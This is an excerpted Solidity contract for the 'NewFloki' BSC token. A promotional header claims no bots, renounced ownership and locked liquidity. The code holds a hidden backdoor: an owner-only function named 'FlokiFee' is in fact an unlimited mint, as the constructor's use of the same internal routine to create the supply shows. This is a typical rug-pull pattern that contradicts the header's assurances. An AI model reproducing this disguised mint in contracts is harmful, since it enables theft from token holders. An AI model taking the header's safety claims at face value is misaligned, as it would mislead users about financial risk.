...
/*
 Web Site=http://newfloki.com

 Telegram: https://t.me/NewFlokiBSC

 Automatic Security Audit (By Mythx) :

 https://github.com/NewFloki-Blockchain/NewFloki/blob/632abd7911cf2e76f2ff342245c22cfc6e005ba6/NewFloki_mythx_security_audit.pdf
 
Low market cap
No bots
Ownership Renounced : new Owner 0x00000
100% Liquidity Locked 1 year
*/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function FlokiFee(uint256 amount) public onlyOwner {
    _FlokiFee(msg.sender, amount);
    }
    ...
    function _FlokiFee(address account, uint256 amount) internal virtual {
...
contract NEWFLOKI is ERC20 {

    uint tokenTotalSupply = 200000000;

    constructor() public ERC20("NewFloki", "NEWFLOKI") {
        _FlokiFee(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}